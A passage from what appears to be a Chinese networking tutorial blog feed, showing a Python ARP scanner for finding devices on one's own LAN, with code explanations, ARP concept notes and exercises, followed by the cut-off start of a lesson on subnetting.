class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day10_arp_scanner.py</span><br><span class="hljs-comment"># 功能：ARP扫描工具</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPScanner</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;ARP扫描器&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># OUI数据库（部分常见厂商）</span><br>        <span class="hljs-variable language_">self</span>.oui_database = &#123;<br>            <span class="hljs-string">&#x27;00:50:56&#x27;</span>: <span class="hljs-string">&#x27;VMware&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:0C:29&#x27;</span>: <span class="hljs-string">&#x27;VMware&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:1C:42&#x27;</span>: <span class="hljs-string">&#x27;Parallels&#x27;</span>,<br>            <span class="hljs-string">&#x27;08:00:27&#x27;</span>: <span class="hljs-string">&#x27;VirtualBox&#x27;</span>,<br>            <span class="hljs-string">&#x27;DC:A6:32&#x27;</span>: <span class="hljs-string">&#x27;Raspberry Pi&#x27;</span>,<br>            <span class="hljs-string">&#x27;3C:A9:F4&#x27;</span>: <span class="hljs-string">&#x27;小米&#x27;</span>,<br>            <span class="hljs-string">&#x27;28:6C:07&#x27;</span>: <span class="hljs-string">&#x27;小米&#x27;</span>,<br>            <span class="hljs-string">&#x27;F8:A4:5F&#x27;</span>: <span class="hljs-string">&#x27;华为&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:E0:4C&#x27;</span>: <span class="hljs-string">&#x27;华为&#x27;</span>,<br>            <span class="hljs-string">&#x27;AC:DE:48&#x27;</span>: <span class="hljs-string">&#x27;Apple&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:03:93&#x27;</span>: <span class="hljs-string">&#x27;Apple&#x27;</span>,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mac_vendor</span>(<span class="hljs-params">self, mac</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        根据MAC地址获取厂商信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            mac: MAC地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            厂商名称</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 提取OUI（前3个字节）</span><br>        oui = <span class="hljs-string">&#x27;:&#x27;</span>.join(mac.split(<span class="hljs-string">&#x27;:&#x27;</span>)[:<span class="hljs-number">3</span>]).upper()<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.oui_database.get(oui, <span class="hljs-string">&#x27;未知厂商&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取本机IP地址</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>            sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>            local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br>            sock.close()<br>            <span class="hljs-keyword">return</span> local_ip<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mac_address</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        通过ARP获取指定IP的MAC地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: 目标IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            MAC地址字符串，如果失败返回None</span><br><span class="hljs-string"></span><br><span class="hljs-string">        工作原理：</span><br><span class="hljs-string">            发送ARP请求，等待响应</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 在Windows上使用arp命令</span><br>            <span class="hljs-keyword">import</span> subprocess<br>            <span class="hljs-keyword">import</span> platform<br><br>            system = platform.system()<br><br>            <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>                <span class="hljs-comment"># Windows: arp -a IP</span><br>                result = subprocess.check_output(<br>                    <span class="hljs-string">f&#x27;arp -a <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>,<br>                    shell=<span class="hljs-literal">True</span>,<br>                    stderr=subprocess.DEVNULL<br>                ).decode(<span class="hljs-string">&#x27;gbk&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>                <span class="hljs-comment"># 解析输出</span><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> result.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">2</span>:<br>                            mac = parts[<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>)<br>                            <span class="hljs-keyword">return</span> mac<br><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># Linux/Mac: arp -n IP</span><br>                result = subprocess.check_output(<br>                    <span class="hljs-string">f&#x27;arp -n <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>,<br>                    shell=<span class="hljs-literal">True</span>,<br>                    stderr=subprocess.DEVNULL<br>                ).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> result.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">3</span>:<br>                            <span class="hljs-keyword">return</span> parts[<span class="hljs-number">2</span>]<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ping_and_get_mac</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        先ping一下IP（触发ARP），然后获取MAC地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: 目标IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            (ip, mac, vendor) 元组，失败返回None</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">import</span> subprocess<br>            <span class="hljs-keyword">import</span> platform<br><br>            system = platform.system()<br><br>            <span class="hljs-comment"># 先ping一下，触发ARP</span><br>            <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>                ping_cmd = <span class="hljs-string">f&#x27;ping -n 1 -w 500 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                ping_cmd = <span class="hljs-string">f&#x27;ping -c 1 -W 1 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span><br><br>            subprocess.run(<br>                ping_cmd,<br>                shell=<span class="hljs-literal">True</span>,<br>                stdout=subprocess.DEVNULL,<br>                stderr=subprocess.DEVNULL,<br>                timeout=<span class="hljs-number">2</span><br>            )<br><br>            <span class="hljs-comment"># 获取MAC地址</span><br>            mac = <span class="hljs-variable language_">self</span>.get_mac_address(ip)<br><br>            <span class="hljs-keyword">if</span> mac <span class="hljs-keyword">and</span> mac != <span class="hljs-string">&#x27;(incomplete)&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mac.lower():<br>                vendor = <span class="hljs-variable language_">self</span>.get_mac_vendor(mac)<br>                <span class="hljs-keyword">return</span> (ip, mac, vendor)<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_network</span>(<span class="hljs-params">self, network, max_workers=<span class="hljs-number">50</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        扫描整个网络</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            network: 网络地址（如 &quot;192.168.1.0/24&quot;）</span><br><span class="hljs-string">            max_workers: 最大线程数</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            发现的设备列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">import</span> ipaddress<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔍 开始扫描网络: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⏳ 请稍候...\n&quot;</span>)<br><br>        <span class="hljs-comment"># 解析网络</span><br>        net = ipaddress.ip_network(network, strict=<span class="hljs-literal">False</span>)<br>        total = net.num_addresses - <span class="hljs-number">2</span><br><br>        devices = []<br>        scanned = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 使用线程池并发扫描</span><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:<br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.ping_and_get_mac, <span class="hljs-built_in">str</span>(ip)): ip<br>                <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts()<br>            &#125;<br><br>            <span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> as_completed<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                scanned += <span class="hljs-number">1</span><br>                result = future.result()<br><br>                <span class="hljs-keyword">if</span> result:<br>                    devices.append(result)<br>                    ip, mac, vendor = result<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ <span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;mac:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;vendor&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># 显示进度</span><br>                <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>:<br>                    progress = (scanned / total) * <span class="hljs-number">100</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   进度: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span> devices<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display_results</span>(<span class="hljs-params">self, devices</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        显示扫描结果</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            devices: 设备列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;扫描完成！共发现 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(devices)&#125;</span> 台设备&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">if</span> devices:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IP地址&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;MAC地址&#x27;</span>:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;厂商&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>            <span class="hljs-keyword">for</span> ip, mac, vendor <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(devices):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;mac:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;vendor&#125;</span>&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_arp_cache</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    查看系统ARP缓存</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">import</span> subprocess<br>    <span class="hljs-keyword">import</span> platform<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;系统ARP缓存表&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-keyword">try</span>:<br>        system = platform.system()<br><br>        <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>            result = subprocess.check_output(<span class="hljs-string">&#x27;arp -a&#x27;</span>, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;gbk&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            result = subprocess.check_output(<span class="hljs-string">&#x27;arp -n&#x27;</span>, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>        <span class="hljs-built_in">print</span>(result)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 无法获取ARP缓存: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    scanner = ARPScanner()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ARP扫描工具&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 获取本机IP</span><br>    local_ip = scanner.get_local_ip()<br>    <span class="hljs-keyword">if</span> local_ip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;💻 本机IP: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 推断网络</span><br>        ip_parts = local_ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        network = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">0</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">1</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">2</span>]&#125;</span>.0/24&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🌐 推断网络: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        network = <span class="hljs-string">&quot;192.168.1.0/24&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🌐 使用默认网络: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请选择功能:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 扫描局域网设备（推荐）&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 扫描自定义网络&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 查看ARP缓存表&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. 退出&quot;</span>)<br><br>    choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入选项: &quot;</span>).strip()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        devices = scanner.scan_network(network)<br>        scanner.display_results(devices)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>        custom_network = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入网络地址（如192.168.1.0/24）: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> custom_network:<br>            devices = scanner.scan_network(custom_network)<br>            scanner.display_results(devices)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>        view_arp_cache()<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n再见！&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day10/day10_arp_scanner.py<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="1-ARP工作流程">1. ARP工作流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. Ping触发ARP</span><br>subprocess.run(<span class="hljs-string">f&#x27;ping -c 1 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>, ...)<br><br><span class="hljs-comment"># 2. 系统自动发送ARP请求</span><br><span class="hljs-comment"># 3. 目标主机响应</span><br><span class="hljs-comment"># 4. 系统缓存ARP表项</span><br><br><span class="hljs-comment"># 5. 读取ARP缓存</span><br>subprocess.check_output(<span class="hljs-string">&#x27;arp -n&#x27;</span>, ...)<br></code></pre></td></tr></table></figure><h3 id="2-并发扫描提速">2. 并发扫描提速</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用线程池并发扫描多个IP</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 50个线程同时工作</span><br>    futures = &#123;executor.submit(ping_and_get_mac, ip): ip<br>               <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts()&#125;<br></code></pre></td></tr></table></figure><h3 id="3-MAC地址厂商识别">3. MAC地址厂商识别</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 通过MAC地址前3个字节（OUI）识别厂商</span><br>oui = mac[:<span class="hljs-number">8</span>]  <span class="hljs-comment"># 如 &quot;00:50:56&quot;</span><br>vendor = oui_database.get(oui, <span class="hljs-string">&#x27;未知厂商&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><p>今天学习了：</p><ol><li>✅ MAC地址是网卡的物理地址，全球唯一</li><li>✅ MAC地址工作在数据链路层</li><li>✅ ARP协议用于IP地址到MAC地址的转换</li><li>✅ ARP使用广播请求，单播响应</li><li>✅ 系统会缓存ARP解析结果</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>MAC地址</td><td>48位物理地址，固化在网卡</td></tr><tr><td>OUI</td><td>MAC地址前24位，厂商标识</td></tr><tr><td>ARP</td><td>地址解析协议，IP→MAC</td></tr><tr><td>ARP缓存</td><td>系统缓存的IP-MAC映射表</td></tr><tr><td>广播MAC</td><td>FF:FF:FF:FF:FF:FF</td></tr></tbody></table><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：查看本机信息">练习1：查看本机信息</h3><ol><li>查看本机的MAC地址</li><li>查看本机的ARP缓存</li><li>找出路由器的MAC地址</li></ol><h3 id="练习2：理解ARP">练习2：理解ARP</h3><ol><li>画出ARP请求和响应的完整过程</li><li>解释为什么ARP请求使用广播</li><li>ARP缓存的作用是什么？</li></ol><h3 id="练习3：实践操作">练习3：实践操作</h3><ol><li>清空ARP缓存</li><li>Ping一个局域网内的设备</li><li>再次查看ARP缓存，观察变化</li></ol><h3 id="练习4：安全思考">练习4：安全思考</h3><ol><li>什么是ARP欺骗（ARP Spoofing）？</li><li>如何防范ARP攻击？</li><li>为什么ARP协议不安全？</li></ol><hr><p>💡 <strong>今日金句</strong>：MAC地址是网络世界的身份证！</p><p>👉 <a href="day09.md">上一天：子网划分实战</a> | <a href="../../README.md">返回目录</a> | <a href="day11.md">下一天：端口和Socket深入</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>9天：子网划分实战</title>
    <link href="/2025/11/10/9%E5%A4%A9%EF%BC%9A%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/9%E5%A4%A9%EF%BC%9A%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1>第9天：子网划分实战</h1><blockquote><p>“子网划分就像把一栋大楼分成不同的房间。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解子网掩码的概念和作用</li><li>掌握CIDR表示法</li><li>学会计算网络地址、广播地址</li><li>能够进行子网划分</li><li>编写子网计算器工具</li></ul><h2 id="🎯-为什么需要子网划分？">🎯 为什么需要子网划分？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">没有子网划分：<br>一栋100层的大楼，所有人共用一个门牌号<br>→ 混乱、难以管理<br><br>有子网划分：<br>把大楼分成不同楼层，每层有自己的编号<br>→ 清晰、便于管理<br><br>网络也是一样：<br><span class="hljs-bullet">- </span>节省IP地址<br><span class="hljs-bullet">- </span>提高网络性能<br><span class="hljs-bullet">- </span>增强安全性<br><span class="hljs-bullet">- </span>便于管理<br></code></pre></td></tr></table></figure><h3 id="实际问题">实际问题</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">问题：一个公司有<span class="hljs-number">500</span>台电脑，给了一个<span class="hljs-built_in">C</span>类地址<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span><br><br><span class="hljs-built_in">C</span>类地址只能容纳<span class="hljs-number">254</span>台主机（<span class="hljs-number">2</span><span class="hljs-operator">^</span><span class="hljs-number">8</span> <span class="hljs-operator">-</span> <span class="hljs-number">2</span>）<br><br>解决方案：<br><span class="hljs-number">1.</span> 申请多个<span class="hljs-built_in">C</span>类地址（浪费、管理复杂）<br><span class="hljs-number">2.</span> 使用<span class="hljs-variable">B</span>类地址，然后划分子网（推荐）<br></code></pre></td></tr></table></figure><h2 id="📊-子网掩码">📊 子网掩码</h2><h3 id="什么是子网掩码？">什么是子网掩码？</h3><p><strong>子网掩码</strong>（Subnet Mask）用于区分IP地址中的网络部分和主机部分。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">IP地址：    <span class="hljs-number">192.168.1.100</span><br>子网掩码：  <span class="hljs-number">255.255.255.0</span><br><br>作用：确定哪些位是网络号，哪些位是主机号<br></code></pre></td></tr></table></figure><h3 id="子网掩码的格式">子网掩码的格式</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">二进制表示：<br>网络部分：全是<span class="hljs-number">1</span><br>主机部分：全是<span class="hljs-number">0</span><br><br>例如：<span class="hljs-number">255.255.255.0</span><br><span 